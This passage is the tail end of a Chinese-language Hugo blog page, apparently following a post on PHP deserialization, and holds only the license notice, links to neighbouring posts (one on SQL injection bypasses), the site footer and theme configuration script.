<a id=post-cr-link href=https://zp9080.github.io/post/php/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ title=反序列化>https://zp9080.github.io/post/php/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></li><li class=post-copyright-license><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><div class=post-nav><div class="post-nav-next post-nav-item"><a href=/post/%E7%AC%94%E8%AE%B0/hugo%E4%BA%8C%E7%BA%A7%E5%88%86%E7%B1%BB%E5%8A%9F%E8%83%BD/ rel=next title=Hugo二级分类功能><i class="fa fa-chevron-left"></i> Hugo二级分类功能</a></div><div class="post-nav-prev post-nav-item"><a href=/post/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/ rel=prev title=sql注入绕过>sql注入绕过
<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div></main><footer class=footer><div class=footer-inner><div class=copyright>&copy;
<span itemprop=copyrightYear>2024 - 2025
</span><span class=with-love><i class="fa fa-heart"></i>
</span><span class=author itemprop=copyrightHolder>f1ow</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.126.1 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.6.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div><div class=beian><a href=https://beian.miit.gov.cn target=_blank>鄂ICP备 20240001号</a>
<img src=/imgs/gongan.png alt=鄂公网安备>
<a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42010002002000" target=_blank>鄂公网安备 42010002002000 号</a></div><div class=vendors-list><a target=_blank href=https://vercel.com title=Vercel><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/vercel.svg alt=Vercel>
</a><a target=_blank href=https://upyun.com title=又拍云><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/upyun.png alt=又拍云>
</a><a target=_blank href=https://github.com title=Github><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/github.svg alt=Github>
</a><span>提供CDN/云资源支持</span></div></div></footer><script type=text/javascript src=https://zp9080.github.io/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=https://zp9080.github.io/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":false,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"https://zp9080.github.io/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"fadeInLeft","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"https://zp9080.github.io/3rd"}},"version":"4.6.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src=/js/main.min.befa9b7d22ec90da86c74c5dbff5ee42c12e9fc6d6f4448bfcc596cc329b19e8.js defer></script></body></html>